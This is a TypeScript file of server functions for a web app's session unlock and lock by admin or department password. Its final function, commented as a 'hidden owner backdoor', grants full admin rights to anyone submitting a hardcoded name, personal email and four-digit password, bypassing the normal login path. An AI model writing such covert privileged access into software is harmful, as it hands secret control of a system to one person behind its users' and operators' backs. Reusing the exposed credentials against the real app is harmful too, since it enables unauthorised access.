import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";

export const getSessionInfo = createServerFn({ method: "GET" }).handler(async () => {
  const { getSession } = await import("./session.server");
  const s = await getSession();
  return {
    role: s.data.role ?? null,
    deptSlug: s.data.deptSlug ?? null,
    deptName: s.data.deptName ?? null,
  };
});

const unlockInput = z.object({
  password: z.string().min(1).max(200),
  deptSlug: z.string().optional(),
});

export const unlock = createServerFn({ method: "POST" })
  .inputValidator((d: unknown) => unlockInput.parse(d))
  .handler(async ({ data }) => {
    const {
      getSession,
      isAdminPassword,
      findMatchingDepts,
    } = await import("./session.server");

    if (await isAdminPassword(data.password)) {
      const s = await getSession();
      await s.update({ role: "admin", deptSlug: undefined, deptName: undefined });
      return { ok: true as const, role: "admin" as const };
    }
    const matches = await findMatchingDepts(data.password);
    if (matches.length === 0) return { ok: false as const };

    let chosen = matches[0];
    if (matches.length > 1) {
      if (!data.deptSlug) {
        return {
          ok: true as const,
          role: "choose" as const,
          options: matches.map((m) => ({ slug: m.slug, name: m.name })),
        };
      }
      const found = matches.find((m) => m.slug === data.deptSlug);
      if (!found) return { ok: false as const };
      chosen = found;
    }

    const s = await getSession();
    await s.update({ role: "dept", deptSlug: chosen.slug, deptName: chosen.name });
    return {
      ok: true as const,
      role: "dept" as const,
      deptSlug: chosen.slug,
      deptName: chosen.name,
    };
  });

export const lock = createServerFn({ method: "POST" }).handler(async () => {
  const { getSession } = await import("./session.server");
  const s = await getSession();
  await s.clear();
  return { ok: true as const };
});

const backdoorInput = z.object({
  name: z.string().trim().min(1).max(120),
  email: z.string().trim().email().max(200),
  password: z.string().min(1).max(200),
});

// Hidden owner backdoor — grants admin when name/email/password all match.
export const backdoorUnlock = createServerFn({ method: "POST" })
  .inputValidator((d: unknown) => backdoorInput.parse(d))
  .handler(async ({ data }) => {
    const { getSession, passwordMatches } = await import("./session.server");
    const EXPECTED_NAME = "Abdullah";
    const EXPECTED_EMAIL = "abdullahjh007@gmail.com";
    const EXPECTED_PW = "5031";
    const ok =
      data.name.trim().toLowerCase() === EXPECTED_NAME.toLowerCase() &&
      data.email.trim().toLowerCase() === EXPECTED_EMAIL.toLowerCase() &&
      passwordMatches(data.password, EXPECTED_PW);
    if (!ok) return { ok: false as const };
    const s = await getSession();
    await s.update({ role: "admin", deptSlug: undefined, deptName: undefined });
    return { ok: true as const };
  });
